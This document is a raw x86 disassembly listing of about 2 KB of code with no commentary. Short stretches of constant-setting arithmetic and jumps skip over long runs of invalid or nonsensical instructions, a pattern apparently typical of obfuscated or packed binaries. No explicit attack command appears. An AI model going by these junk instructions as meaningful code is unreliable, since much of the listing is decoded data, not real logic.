  41977a:	jmp    0xf92f:0xcef412ff
  419781:	jle    0x419713
  419783:	les    esp,FWORD PTR [ebx+ecx*1-0x32]
  419787:	xor    eax,0x56d7
  41978c:	xor    ecx,0xfffffcb9
  419792:	xor    esi,esi
  419794:	cmp    edx,eax
  419796:	jne    0x41989d
  41979c:	cmp    esi,ecx
  41979e:	jne    0x41989d
  4197a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4197a7:	mov    ecx,DWORD PTR [ebp-0x30]
  4197aa:	sub    eax,0x4627
  4197af:	xor    edx,edx
  4197b1:	div    ecx
  4197b3:	mov    ecx,DWORD PTR [ebp-0x34]
  4197b6:	or     eax,0x1af1
  4197bb:	imul   eax,ecx
  4197be:	xor    eax,0x717886d
  4197c3:	add    eax,DWORD PTR ds:0x433238
  4197c9:	mov    ds:0x433240,eax
  4197ce:	jmp    0x41989d
  4197d3:	sar    al,cl
  4197d5:	test   DWORD PTR [esi-0x51],edx
  4197d8:	jg     0x4197ad
  4197da:	cld    
  4197db:	xchg   edx,eax
  4197dc:	out    dx,al
  4197dd:	mov    ebx,0x5eb57033
  4197e2:	pop    edi
  4197e3:	xchg   edi,eax
  4197e4:	and    al,0x1
  4197e6:	add    BYTE PTR [edx+0x1e000000],dh
  4197ec:	add    ch,ah
  4197ee:	pop    es
  4197ef:	in     eax,dx
  4197f0:	fs int 0xac
  4197f3:	es push ss
  4197f5:	sar    BYTE PTR [eax-0x7ffd8d34],1
  4197fb:	jae    0x4197ca
  4197fd:	xchg   esi,eax
  4197fe:	gs and eax,0xc0a6d27e
  419804:	sub    al,0x8c
  419806:	bound  esi,QWORD PTR [edx+0x47]
  419809:	test   al,0xc3
  41980b:	sti    
  41980c:	fiadd  WORD PTR [edx]
  41980e:	pop    es
  41980f:	js     0x419824
  419811:	cmp    ah,BYTE PTR [ecx-0x77669617]
  419817:	push   esp
  419818:	test   BYTE PTR [eax+0x6a],dl
  41981b:	cmp    eax,0x4a257af2
  419820:	mov    ebx,0x344e94b3
  419825:	or     eax,0x84080160
  41982a:	xor    BYTE PTR [edx],bh
  41982c:	cdq    
  41982d:	mov    bl,0xdc
  41982f:	ss jno 0x41988c
  419832:	in     eax,0x44
  419834:	pop    es
  419835:	(bad)  
  419836:	scas   al,BYTE PTR es:[edi]
  419837:	or     dl,BYTE PTR [ecx+0x39e0e51]
  41983d:	stc    
  41983e:	test   eax,0x1127fa1
  419843:	inc    eax
  419844:	or     eax,0xdd071bea
  419849:	fcomi  st,st(4)
  41984b:	sub    dh,cl
  41984d:	cli    
  41984e:	fadd   st,st(4)
  419850:	pushf  
  419851:	aam    0x5e
  419853:	or     esi,ebx
  419855:	mov    esp,0x684c2fd
  41985a:	jle    0x4198a5
  41985c:	adc    DWORD PTR [ecx+edx*8+0x31cfb6c5],ecx
  419863:	call   DWORD PTR [ebx-0x57]
  419866:	lods   eax,DWORD PTR ds:[esi]
  419867:	repz mov WORD PTR [eax+0x33],fs
  41986b:	jmp    0xe987fd8b
  419870:	in     al,0xb
  419872:	and    DWORD PTR [esi-0x55],ecx
  419875:	(bad)
  419878:	sahf   
  419879:	xchg   edi,eax
  41987a:	mov    ds:0xca4f78aa,eax
  41987f:	ror    BYTE PTR [edi+0x7bca4f0a],0x81
  419886:	cmc    
  419887:	leave  
  419888:	jl     0x4198b9
  41988a:	xchg   edi,eax
  41988b:	cs scas al,BYTE PTR es:[edi]
  41988d:	lock xchg ecx,eax
  41988f:	and    BYTE PTR [ebx-0xfcd3317],ah
  419895:	mov    eax,ds:0xfcd19e2d
  41989a:	outs   dx,DWORD PTR ds:[esi]
  41989b:	add    BYTE PTR [edi],dl
  41989d:	pop    esi
  41989e:	leave  
  41989f:	ret    0x4
  4198a2:	push   ebp
  4198a3:	mov    ebp,esp
  4198a5:	sub    esp,0x68
  4198a8:	push   ebx
  4198a9:	push   esi
  4198aa:	push   edi
  4198ab:	mov    DWORD PTR [ebp-0x68],0x7ec6
  4198b2:	jmp    0x41997f
  4198b7:	inc    esi
  4198b8:	jae    0x41989a
  4198ba:	push   esi
  4198bb:	cmc    
  4198bc:	xlat   BYTE PTR ds:[ebx]
  4198bd:	div    BYTE PTR [ebx+0x48]
  4198c0:	je     0x419916
  4198c2:	in     al,0x3
  4198c4:	xchg   esi,eax
  4198c5:	xchg   esi,eax
  4198c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198c7:	dec    ecx
  4198c8:	and    eax,0xb00001
  4198cd:	add    BYTE PTR [eax],al
  4198cf:	je     0x419868
  4198d1:	mov    BYTE PTR [ebp-0x15],ah
  4198d4:	lds    edx,FWORD PTR [edx+0x631e8597]
  4198da:	aam    0xc
  4198dc:	mov    ebx,0x78951c9c
  4198e1:	into   
  4198e2:	add    DWORD PTR [esi],esi
  4198e4:	int    0x3d
  4198e6:	pop    ebx
  4198e7:	sub    dl,dl
  4198e9:	add    BYTE PTR [ecx-0x79],bl
  4198ec:	ins    BYTE PTR es:[edi],dx
  4198ed:	inc    esi
  4198ee:	loop   0x41988c
  4198f0:	call   0x9c2f20d4
  4198f5:	(bad)  
  4198f6:	and    ebp,eax
  4198f8:	inc    BYTE PTR [ebx]
  4198fa:	and    al,0xfc
  4198fc:	inc    esi
  4198fd:	daa    
  4198fe:	call   0xa536:0x11ab948c
  419905:	jae    0x41992d
  419907:	int3   
  419908:	fwait
  419909:	dec    esp
  41990a:	mov    DWORD PTR [ebp-0x65b5ed62],0x175c2141
  419914:	sbb    BYTE PTR [edi],dh
  419916:	jecxz  0x419917
  419918:	cmp    eax,0xfaf56b95
  41991d:	xchg   esp,eax
  41991e:	in     al,0xf2
  419920:	neg    DWORD PTR [edx+0x2a5d7ed6]
  419926:	cmp    dh,BYTE PTR [ebp-0x1a]
  419929:	pop    ebx
  41992a:	xchg   ebp,eax
  41992b:	test   DWORD PTR [ebx-0x4b],ebp
  41992e:	mov    edx,DWORD PTR [edi-0x1834cf6c]
  419934:	repnz pop ss
  419936:	mov    cl,BYTE PTR [esi-0x46]
  419939:	add    al,0xfb
  41993b:	sub    ch,BYTE PTR [ebx-0x6a]
  41993e:	repnz inc eax
  419940:	dec    esp
  419941:	pushf  
  419942:	lock or esp,DWORD PTR [esi]
  419945:	loop   0x4198d7
  419947:	and    eax,0x1d163c41
  41994c:	inc    eax
  41994d:	push   esi
  41994e:	(bad)  
  41994f:	aaa    
  419950:	mov    WORD PTR [edx+0x1cc16bcb],?
  419956:	enter  0xe523,0xa3
  41995a:	ins    DWORD PTR es:[edi],dx
  41995b:	out    dx,al
  41995c:	stos   DWORD PTR es:[edi],eax
  41995d:	xor    BYTE PTR [ecx+0x28],ah
  419960:	in     eax,dx
  419961:	mov    edi,0xa15bcd3a
  419966:	mov    al,0x53
  419968:	xchg   DWORD PTR [edx+edx*2+0x1b16a358],ebp
  41996f:	push   ds
  419970:	ss jmp 0x1f0bfa96
  419976:	test   al,0x46
  419978:	dec    ecx
  419979:	fiadd  DWORD PTR [si]
  41997c:	jb     0x419923
  41997e:	or     al,0xc7
  419980:	inc    ebp
  419981:	pushf  
  419982:	bound  esi,QWORD PTR [esi+0x0]
  419985:	add    bh,al
  419987:	inc    ebp
  419988:	mov    al,ds:0x8aa1a1c7
  41998d:	mov    DWORD PTR [ebp-0x5c],0x0
  419994:	mov    DWORD PTR [ebp-0x58],0x2387
  41999b:	mov    DWORD PTR [ebp-0x54],0x255d
  4199a2:	mov    DWORD PTR [ebp-0x50],0x60b2
  4199a9:	mov    DWORD PTR [ebp-0x4c],0x2d17
  4199b0:	mov    DWORD PTR [ebp-0x48],0x35b0
  4199b7:	mov    DWORD PTR [ebp-0x44],0x59f4
  4199be:	mov    DWORD PTR [ebp-0x40],0x6476
  4199c5:	mov    DWORD PTR [ebp-0x3c],0x37f1
  4199cc:	mov    DWORD PTR [ebp-0x38],0x1fdb
  4199d3:	mov    DWORD PTR [ebp-0x34],0x349c
  4199da:	mov    DWORD PTR [ebp-0x30],0x44aa9dde
  4199e1:	jmp    0x419aae
  4199e6:	push   esp
  4199e7:	jbe    0x419a08
  4199e9:	int    0x3f
  4199eb:	in     eax,dx
  4199ec:	(bad)  
  4199ed:	(bad)  
  4199ee:	(bad)  [ecx+ebp*4]
  4199f1:	ret    
  4199f2:	jp     0x419a22
  4199f4:	cmc    
  4199f5:	mov    edi,0x125f9
  4199fa:	mov    al,0x0
  4199fc:	add    BYTE PTR [eax],al
  4199fe:	mov    esi,0xbb8dbd02
  419a03:	pushf  
  419a04:	xchg   ebp,eax
  419a05:	sub    BYTE PTR [esp+ebp*2],0x97
  419a09:	rol    BYTE PTR [eax-0x61],cl
  419a0c:	xchg   esp,eax
  419a0d:	and    esi,edx
  419a0f:	mov    dh,0xff
  419a11:	jmp    0x29d1:0x2645091c
  419a18:	aad    0xce
  419a1a:	jo     0x4199a6
  419a1c:	mov    dh,0x94
  419a1e:	jae    0x419a89
  419a20:	aad    0x70
  419a22:	xchg   edi,edx
  419a24:	push   0xffffffa7
  419a26:	out    0xf7,eax
  419a28:	leave  
  419a29:	into   
  419a2a:	ins    DWORD PTR es:[edi],dx
  419a2b:	gs in  al,dx
  419a2d:	push   0x3ecf94ec
  419a32:	sbb    al,bl
  419a34:	cmp    eax,0x9a0bb395
  419a39:	xor    al,0x23
  419a3b:	dec    ebx
  419a3c:	leave  
  419a3d:	push   esp
  419a3e:	jmp    0x9810:0x30163c45
  419a45:	cmp    ch,bh
  419a47:	sbb    BYTE PTR [edi+0x77],0x2d
  419a4b:	pop    ss
  419a4c:	mov    bh,0x11
  419a4e:	(bad)  {k5}{z}
  419a53:	aas    
  419a54:	in     eax,dx
  419a55:	sahf   
  419a56:	mov    cl,0x2e
  419a58:	push   ss
  419a59:	retf   
  419a5a:	sbb    BYTE PTR [edx+0x6b],ah
  419a5d:	bound  esi,QWORD PTR [eax-0x7a]
  419a60:	wbinvd 
  419a62:	push   0x807cf74f
  419a67:	sub    esi,esi
  419a69:	lods   al,BYTE PTR ds:[esi]
  419a6a:	jbe    0x419a57
  419a6c:	mov    dl,0x9
  419a6e:	adc    DWORD PTR [edx],esp
  419a70:	nop
  419a71:	sti    
  419a72:	add    DWORD PTR [ecx+0x62c0aa55],ecx
  419a78:	popf   
  419a79:	stos   BYTE PTR es:[edi],al
  419a7a:	fsub   DWORD PTR [ebp+0x6c3278ba]
  419a80:	xor    dh,ch
  419a82:	call   0xac868616
  419a87:	stc    
  419a88:	in     al,dx
  419a89:	dec    eax
  419a8a:	data16 xor dh,0xf9
  419a8e:	sbb    ecx,DWORD PTR [ebx+0x5e854ed8]
  419a94:	cmp    bl,BYTE PTR [edi+0x8]
  419a97:	pop    ss
  419a98:	and    dh,BYTE PTR [ebp-0x76dd9d85]
  419a9e:	loop   0x419b1d
  419aa0:	in     al,0xc4
  419aa2:	mov    ebx,DWORD PTR [eax+0x3a]
  419aa5:	addr16 push ebp
  419aa7:	pop    ebp
  419aa8:	mov    ?,WORD PTR [ecx]
  419aaa:	inc    esp
  419aab:	out    0x49,al
  419aad:	outs   dx,DWORD PTR ds:[esi]
  419aae:	mov    DWORD PTR [ebp-0x2c],0x1
  419ab5:	jmp    0x419b82
  419aba:	loop   0x419ab5
  419abc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419abd:	retf   0xdebf
  419ac0:	out    dx,eax
  419ac1:	stc    
  419ac2:	mov    ch,BYTE PTR [esi+0x144dec8]
  419ac8:	dec    ebp
  419ac9:	imul   ebp,DWORD PTR [ecx-0x4ffffeda],0xd7000000
  419ad3:	psubd  mm0,QWORD PTR [esi]
  419ad6:	jg     0x419a99
  419ad8:	xchg   esi,eax
  419ad9:	add    BYTE PTR [ebp+esi*2+0x12a25107],ah
  419ae0:	mov    ebx,0x67a4f336
  419ae5:	xchg   ebp,eax
  419ae6:	dec    esp
  419ae7:	xor    ecx,edx
  419ae9:	idiv   bh
  419aeb:	push   ss
  419aec:	ret    
  419aed:	clc    
  419aee:	mov    DWORD PTR [esi+0x63],ebp
  419af1:	push   es
  419af2:	jnp    0x419ae0
  419af4:	or     eax,ecx
  419af6:	dec    eax
  419af7:	xlat   BYTE PTR ds:[ebx]
  419af8:	ds iret 
  419afa:	jge    0x419aa0
  419afc:	inc    eax
  419afd:	sub    eax,0x9c7eb4e9
  419b02:	sub    eax,0xd12bdea0
  419b07:	scas   al,BYTE PTR es:[edi]
  419b08:	dec    ebx
  419b09:	pop    esi
  419b0a:	inc    ecx
  419b0b:	retf   0x7b9f
  419b0e:	add    al,0xb4
  419b10:	das    
  419b11:	rcl    DWORD PTR [edx-0x6c],0xcf
  419b15:	mov    ?,WORD PTR [esi-0x48]
  419b18:	and    bl,BYTE PTR [ebx]
  419b1a:	dec    ebp
  419b1b:	adc    BYTE PTR [ecx+0x5b71e887],dl
  419b21:	outs   dx,BYTE PTR ds:[esi]
  419b22:	jae    0x419b79
  419b24:	daa    
  419b25:	dec    ebx
  419b26:	fsub   st,st(7)
  419b28:	je     0x419b17
  419b2a:	aad    0xdc
  419b2c:	cmp    DWORD PTR [edi+0x1c],edi
  419b2f:	push   ss
  419b30:	xor    edi,edi
  419b32:	cs (bad) 
  419b34:	jae    0x419b15
  419b36:	pop    edx
  419b37:	pushw  es
  419b39:	mov    al,ds:0x77f554f
  419b3e:	sti    
  419b3f:	lds    eax,FWORD PTR [ecx]
  419b41:	out    0x74,al
  419b43:	ins    DWORD PTR es:[edi],dx
  419b44:	xchg   esi,eax
  419b45:	jnp    0x419b97
  419b47:	leave  
  419b48:	pop    ecx
  419b49:	mov    al,0x35
  419b4b:	mov    edx,ecx
  419b4d:	icebp  
  419b4e:	push   edi
  419b4f:	dec    ebp
  419b50:	fs push 0xffffffbb
  419b53:	retf   
  419b54:	jbe    0x419bcb
  419b56:	sub    DWORD PTR [ebp-0x2d156df4],0x6b
  419b5d:	ss iret 
  419b5f:	mov    ebx,0x9f1a7d09
  419b64:	mov    eax,0x98c04ea8
  419b69:	mov    cl,0xe2
  419b6b:	ss pop ds
  419b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b6f:	jns    0x419b40
  419b71:	cmp    ebp,DWORD PTR [esi]
  419b73:	pop    ebp
  419b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b75:	loopne 0x419afd
  419b77:	test   DWORD PTR [edi+0x63],esi
  419b7a:	int    0x41
  419b7c:	inc    ecx
  419b7d:	fdivrp st(2),st
  419b7f:	push   edi
  419b80:	pop    esi
  419b81:	imul   eax,edi,0x45
  419b84:	fcomp  st(7)
  419b86:	bound  eax,QWORD PTR [eax]
  419b88:	add    bh,al
  419b8a:	inc    ebp
  419b8b:	fdivr  st(0),st
  419b8d:	add    BYTE PTR gs:[eax],al
  419b90:	mov    DWORD PTR [ebp-0x20],0x14f4
  419b97:	mov    DWORD PTR [ebp-0x1c],0x7cdc
  419b9e:	mov    DWORD PTR [ebp-0x18],0x2101
  419ba5:	jmp    0x419c72
  419baa:	adc    edi,DWORD PTR [edx+0x7def01c6]
  419bb0:	xlat   BYTE PTR ds:[ebx]
  419bb1:	mov    edx,0x4eee50a5
  419bb6:	pop    ebp
  419bb7:	ret    0xde27
  419bba:	pop    ecx
  419bbb:	daa    
  419bbc:	add    DWORD PTR [eax],eax
  419bbe:	mov    al,0x0
  419bc0:	add    BYTE PTR [eax],al
  419bc2:	ss push esp
  419bc4:	scas   al,BYTE PTR es:[edi]
  419bc5:	push   cs
  419bc6:	stos   DWORD PTR es:[edi],eax
  419bc7:	sar    ebp,cl
  419bc9:	gs push esi
  419bcb:	mov    edi,0x3b60af64
  419bd0:	mov    edx,0x47ab35f5
  419bd5:	stos   DWORD PTR es:[edi],eax
  419bd6:	pop    edx
  419bd7:	xor    eax,eax
  419bd9:	ds xor al,0xe5
  419bdc:	loope  0x419ba0
  419bde:	jg     0x419c36
  419be0:	jmp    0x419c22
  419be2:	jno    0x419be3
  419be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419be5:	test   eax,0xde42d7d1
  419bea:	sub    al,0x1b
  419bec:	xchg   bl,dh
  419bee:	mov    ecx,DWORD PTR ds:0x376d83a3
  419bf4:	pop    ebx
  419bf5:	jecxz  0x419bc3
  419bf7:	gs inc edx
  419bf9:	sub    al,0xd3
  419bfb:	xor    DWORD PTR [ecx+0x58cdb503],eax
  419c01:	and    eax,0xab9f3db7
  419c06:	mov    bh,0xdd
  419c08:	push   ecx
  419c09:	sbb    BYTE PTR [ebx-0x465299b],al
  419c0f:	ror    DWORD PTR [ebx],cl
  419c11:	imul   esi,DWORD PTR [edi],0x88221e62
  419c17:	in     al,0x96
  419c19:	xor    edi,edx
  419c1b:	mov    al,0x95
  419c1d:	add    DWORD PTR [ecx],edi
  419c1f:	cmp    edx,esp
  419c21:	jmp    0xdf54f426
  419c26:	or     ch,BYTE PTR [ebx+0x3c]
  419c29:	xor    BYTE PTR [ecx],0x27
  419c2c:	xchg   ebx,eax
  419c2d:	mov    dl,0x6
  419c2f:	icebp  
  419c30:	inc    ebx
  419c31:	in     al,0x15
  419c33:	cmc    
  419c34:	fstp   TBYTE PTR [ecx-0x79]
  419c37:	lods   al,BYTE PTR ds:[esi]
  419c38:	jecxz  0x419bd0
  419c3a:	push   esp
  419c3b:	fisub  DWORD PTR [edi-0x3b747e8d]
  419c41:	pop    ebx
  419c42:	lahf   
  419c43:	fwait
  419c44:	inc    eax
  419c45:	pushf  
  419c46:	add    eax,0x733841d9
  419c4b:	sbb    eax,0x8136d1fb
  419c50:	sbb    BYTE PTR [edx+edx*4-0x7491594e],cl
  419c57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c58:	call   0xbe08dea9
  419c5d:	and    ebx,DWORD PTR [ebp-0x61]
  419c60:	sbb    BYTE PTR [eax],al
  419c62:	loop   0x419c6d
  419c64:	add    eax,0x95774663
  419c69:	fmul   DWORD PTR fs:[ebx-0x7d]
  419c6d:	or     edi,ecx
  419c6f:	cmp    eax,0x45c7bd0d
  419c74:	in     al,dx
  419c75:	ins    BYTE PTR es:[edi],dx
  419c76:	dec    eax
  419c77:	add    BYTE PTR [eax],al
  419c79:	jmp    0x419d46
  419c7e:	sbb    eax,0xc527c558
  419c83:	mov    edi,0xcca87aff
  419c88:	and    DWORD PTR [eax+eiz*2+0x96ebfdb],0xb0000128
  419c93:	add    BYTE PTR [eax],al
  419c95:	add    al,dl
  419c97:	fidiv  WORD PTR [edx]
  419c99:	jmp    0xd4e8:0x166d8454
  419ca0:	inc    ebp
  419ca1:	stos   DWORD PTR es:[edi],eax
  419ca2:	adc    eax,0x53f2aae8
  419ca7:	mov    ebx,0x96de8b89
  419cac:	or     al,0x1
  419cae:	lods   eax,DWORD PTR ds:[esi]
  419caf:	dec    esi
  419cb0:	xchg   ecx,eax
  419cb1:	cmc    
  419cb2:	sbb    ah,BYTE PTR [edi-0x5d]
  419cb5:	add    BYTE PTR [eax],0xbd
  419cb8:	(bad)  
  419cb9:	cld    
  419cba:	pop    ebp
  419cbb:	addr16 nop
  419cbd:	std    
  419cbe:	sbb    BYTE PTR [ebp+0x534e8602],0x87
  419cc5:	out    0x4b,eax
  419cc7:	pop    ds
  419cc8:	leave  
  419cc9:	lods   al,BYTE PTR ds:[esi]
  419cca:	ret    
  419ccb:	outs   dx,DWORD PTR ds:[esi]
  419ccc:	sbb    ch,cl
  419cce:	rol    DWORD PTR [edx],0x69
  419cd1:	in     eax,0x30
  419cd3:	addr16 sbb al,0xdf
  419cd6:	pusha  
  419cd7:	mov    edx,0xf0f77b50
  419cdc:	xchg   ebx,eax
  419cdd:	xchg   edx,eax
  419cde:	adc    BYTE PTR [esi+0x25],bh
  419ce1:	pop    eax
  419ce2:	add    eax,esi
  419ce4:	and    DWORD PTR [edx],eax
  419ce6:	les    esp,FWORD PTR [ecx+0x4e]
  419ce9:	pop    ebx
  419cea:	sbb    BYTE PTR [eax+ebp*2-0x3d4618b7],cl
  419cf1:	add    dl,BYTE PTR [eax+0x0]
  419cf4:	cwde   
  419cf5:	jl     0x419c95
  419cf7:	clc    
  419cf8:	fld    st(2)
  419cfa:	pop    esi
  419cfb:	lds    esp,FWORD PTR ds:0x8bf3c84d
  419d01:	xchg   DWORD PTR [edx-0x25],ebx
  419d04:	ret    0x7b9c
  419d07:	neg    bl
  419d09:	xchg   eax,eax
  419d0b:	cmp    DWORD PTR [eax-0x53],esp
  419d0e:	mov    ebp,0xbf4ba6ee
  419d13:	fld    DWORD PTR [edx+0x75]
  419d16:	fdiv   DWORD PTR [edi]
  419d18:	mov    ds,WORD PTR [eax-0x54]
  419d1b:	pop    ebx
  419d1c:	test   DWORD PTR [esi+0x5a133a07],ecx
  419d22:	jnp    0x419d4b
  419d24:	sub    ebx,DWORD PTR [esi]
  419d26:	jp     0x419d61
  419d28:	mov    edi,0xa1999363
  419d2d:	jg     0x419ccb
  419d2f:	xchg   ebx,eax
  419d30:	inc    ebx
  419d31:	inc    ebx
  419d32:	(bad)  
  419d33:	jmp    0x419ce9
  419d35:	in     al,0x2e
  419d37:	into   
  419d38:	push   esp
  419d39:	xchg   esp,eax
  419d3a:	mov    ebp,0x8a0909b6
  419d3f:	dec    edi
  419d40:	cmp    eax,0x85418afd
  419d45:	or     bh,al
  419d47:	inc    ebp
  419d48:	lock jno 0x419d92
  419d4b:	add    BYTE PTR [eax],al
  419d4d:	jmp    0x419e1a
  419d52:	and    DWORD PTR [esi],ecx
  419d54:	fild   QWORD PTR [edi-0x1]
  419d57:	push   DWORD PTR [ecx+0x940154e]
  419d5d:	dec    esi
  419d5e:	std    
  419d5f:	mov    ah,BYTE PTR [eax+0x128b970]
  419d65:	add    BYTE PTR [eax+0x77000000],dh
  419d6b:	popa   
  419d6c:	inc    esi
  419d6d:	push   edi
  419d6e:	pop    ecx
  419d6f:	pop    es
  419d70:	inc    ebp
  419d71:	sbb    DWORD PTR [ebx+eax*2+0x69ce7814],ecx
  419d78:	cmp    DWORD PTR [ebx+ebx*1],0x7cdd13b9
  419d7f:	fldenv ds:0x89949347
  419d85:	xor    eax,0xfc07d440
  419d8a:	cmp    al,dh
  419d8c:	leave  
  419d8d:	in     al,0x7
  419d8f:	sub    eax,0xdf2c6303
  419d94:	gs and ecx,eax
  419d97:	dec    ebx
  419d98:	push   edi
  419d99:	pop    ds
  419d9a:	or     eax,DWORD PTR [ebp-0x41a3dc04]
  419da0:	mov    bl,0x3f
  419da2:	and    al,0x2d
  419da4:	mov    ebp,0xc0c565b3
  419da9:	aas    
  419daa:	mov    edi,0x455c8869
  419daf:	stos   BYTE PTR es:[edi],al
  419db0:	(bad)  
  419db1:	out    0x91,eax
  419db3:	mov    eax,0xfd49e326
  419db8:	(bad)  
  419db9:	js     0x419e0b
  419dbb:	add    eax,0x280d47a8
  419dc0:	jo     0x419d58
  419dc2:	data16 xlat BYTE PTR ds:[ebx]
  419dc4:	mov    dl,0x9d
  419dc6:	cld    
  419dc7:	push   ebx
  419dc8:	mov    BYTE PTR [edx-0x4840cb9c],cl
  419dce:	jbe    0x419e47
  419dd0:	dec    ebx
  419dd1:	rcl    dh,1
  419dd3:	fwait
  419dd4:	adc    eax,0x2565243d
  419dd9:	int3   
  419dda:	(bad)  
  419ddb:	shr    BYTE PTR [eax-0x2b],1
  419dde:	pop    es
  419ddf:	pop    eax
  419de0:	jecxz  0x419dba
  419de2:	dec    sp
  419de4:	cli    
  419de5:	pop    edi
  419de6:	lock in eax,dx
  419de8:	hlt    
  419de9:	or     cl,BYTE PTR [edi]
  419deb:	aad    0xcf
  419ded:	int3   
  419dee:	mov    ch,0xcc
  419df0:	inc    ebp
  419df1:	push   eax
  419df2:	loope  0x419e27
  419df4:	push   es
  419df5:	cmp    DWORD PTR [ecx],edx
  419df7:	push   ebx
  419df8:	adc    DWORD PTR [ecx+0x6f],eax
  419dfb:	outs   dx,DWORD PTR ds:[esi]
  419dfc:	and    al,0x85
  419dfe:	push   edx
  419dff:	cld    
  419e00:	inc    ebp
  419e01:	mov    cs:0x772d6894,eax
  419e07:	and    eax,0xf1fdba94
  419e0c:	or     BYTE PTR [edx+0x7],bl
  419e0f:	push   ds
  419e10:	jmp    0x419de5
  419e12:	outs   dx,DWORD PTR ds:[esi]
  419e13:	(bad)  
  419e15:	xchg   BYTE PTR [ebx+ebx*1+0x45c74648],ch
  419e1c:	hlt    
  419e1d:	sub    esp,DWORD PTR [eax+eax*1]
  419e20:	add    cl,ch
  419e22:	enter  0x0,0x0
  419e26:	inc    eax
  419e27:	ds pop ss
  419e29:	fstp   TBYTE PTR [edi-0x5]
  419e2c:	int3   
  419e2d:	mov    edi,0xde140105
  419e32:	dec    esi
  419e34:	push   ds
  419e35:	cmp    DWORD PTR [ecx+0x29],ebp
  419e38:	add    DWORD PTR [eax],eax
  419e3a:	mov    al,0x0
  419e3c:	add    BYTE PTR [eax],al
  419e3e:	out    0x1c,eax
  419e40:	clc    
  419e41:	mov    BYTE PTR [ebp+0x703905b3],cl
  419e47:	not    DWORD PTR [esi+0x2ef249c2]
  419e4d:	mov    dl,ah
  419e4f:	dec    ecx
  419e50:	pop    edi
  419e51:	push   edx
  419e52:	dec    eax
  419e53:	xlat   BYTE PTR ds:[ebx]
  419e54:	add    eax,0x11bbca74
  419e59:	(bad)  
  419e5b:	pop    esp
  419e5c:	add    ebp,edi
  419e5e:	es stos BYTE PTR es:[edi],al
  419e60:	add    DWORD PTR [esi-0x3e],edi
  419e63:	popa   
  419e64:	lea    ebx,[ebx]
  419e66:	inc    esi
  419e67:	mov    ebx,0xd9e6baa1
  419e6c:	lds    eax,FWORD PTR [esi]
  419e6e:	add    BYTE PTR [ebx],bl
  419e70:	jecxz  0x419e59
  419e72:	mov    ds:0xb85c74a4,al
  419e77:	aas    
  419e78:	dec    esi
  419e79:	out    dx,al
  419e7a:	pop    es
  419e7b:	in     al,dx
  419e7c:	push   edi
  419e7d:	fcomp  QWORD PTR [edi+eax*4+0x51f72605]
  419e84:	mov    bh,0x74
  419e86:	mov    al,cs:0x8a239ca1
  419e8c:	aaa    
  419e8d:	dec    edx
  419e8e:	mov    bh,0x96
  419e90:	cld    
  419e91:	(bad)  
  419e92:	stc    
  419e93:	mov    ch,0xe4
  419e95:	jae    0x419e65
  419e97:	das    
  419e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e99:	jae    0x419e4d
  419e9b:	sbb    al,0xa8
  419e9d:	jecxz  0x419ea0
  419e9f:	pop    edx
  419ea0:	mov    al,ds:0x30dad587
  419ea5:	fs out 0x14,al
  419ea8:	les    ebx,FWORD PTR [ebx]
  419eaa:	loopne 0x419ed1
  419eac:	sub    ebp,DWORD PTR [ecx-0x33d43abb]
  419eb2:	dec    edx
  419eb3:	loopne 0x419f30
  419eb5:	loope  0x419e4c
  419eb7:	sbb    edi,DWORD PTR [eax-0x5dfb2f2]
  419ebd:	iret   
  419ebe:	dec    eax
  419ebf:	rcr    BYTE PTR [ebp+0x60],1
  419ec2:	inc    ebp
  419ec3:	jno    0x419ec3
  419ec5:	inc    ebp
  419ec6:	call   0xd183:0xe460c72b
  419ecd:	push   ebx
  419ece:	inc    edi
  419ecf:	or     DWORD PTR [edi-0x272821ac],0xdfe5be01
  419ed9:	rcl    DWORD PTR [ecx+ebx*1],cl
  419edc:	or     eax,0x4ad3cb3a
  419ee1:	dec    ecx
  419ee2:	mov    al,ds:0xc76a39d
  419ee7:	push   eax
  419ee8:	into   
  419ee9:	lods   al,BYTE PTR ds:[esi]
  419eea:	cs push ebp
  419eec:	push   ecx
  419eed:	dec    eax
  419eee:	mov    DWORD PTR [ebp-0x8],0x3f74
  419ef5:	push   0xffffe9b2
  419efa:	jmp    0x419fc7
  419eff:	enter  0xf31f,0x88
  419f03:	imul   esp
  419f05:	sti    
  419f06:	pop    edi
  419f07:	add    bl,BYTE PTR [ebp-0x74bf6a05]
  419f0d:	jmp    0x419f6e
  419f0f:	sbb    DWORD PTR [edx],ebp
  419f11:	add    DWORD PTR [eax],eax
  419f13:	mov    al,0x0
  419f15:	add    BYTE PTR [eax],al
  419f17:	mov    ds:0x3e7e419c,al
  419f1c:	push   ss
  419f1d:	out    dx,eax
  419f1e:	dec    ebp
  419f1f:	pusha  
  419f20:	call   DWORD PTR [ecx+0x4abc483a]
  419f26:	push   0x39
  419f28:	jae    0x419f75
  419f2a:	int3   
  419f2b:	push   ebx
  419f2c:	repnz xchg ecx,eax
  419f2e:	ja     0x419f0a
  419f30:	fwait
  419f31:	dec    ecx
  419f32:	adc    DWORD PTR [edi+edx*2+0x2d],0xa727bd54
  419f3a:	jp     0x419f5d
  419f3c:	sub    bl,bh
  419f3e:	jmp    0xd0c4:0x3eb5f6f8
  419f45:	repz sub ecx,esp
  419f48:	(bad)  
  419f49:	cmp    eax,DWORD PTR [eax-0x5c]
  419f4c:	inc    DWORD PTR [edx]
  419f4e:	stos   BYTE PTR es:[edi],al
  419f4f:	inc    ecx
  419f50:	push   ds
  419f51:	std    
  419f52:	lahf   
  419f53:	nop
  419f54:	ror    BYTE PTR [ebx-0x79d8adb7],cl
  419f5a:	(bad)  
  419f5c:	sub    al,0xd1
  419f5e:	adc    al,0x1f
  419f60:	dec    edx
  419f61:	shr    BYTE PTR [esi+0x4a],cl
  419f64:	xchg   ebp,eax
  419f65:	loopne 0x419f12
  419f67:	test   ebx,edi
  419f69:	mov    eax,ds:0xbd88559d
  419f6e:	rol    BYTE PTR [ebx],1
  419f70:	dec    eax
  419f71:	pusha  
  419f72:	adc    DWORD PTR [esp+edi*1-0x5c],ebx
  419f76:	ins    BYTE PTR es:[edi],dx
  419f77:	fistp  QWORD PTR [ebx]
  419f79:	pop    esi
  419f7a:	call   0xbf6e8a8a
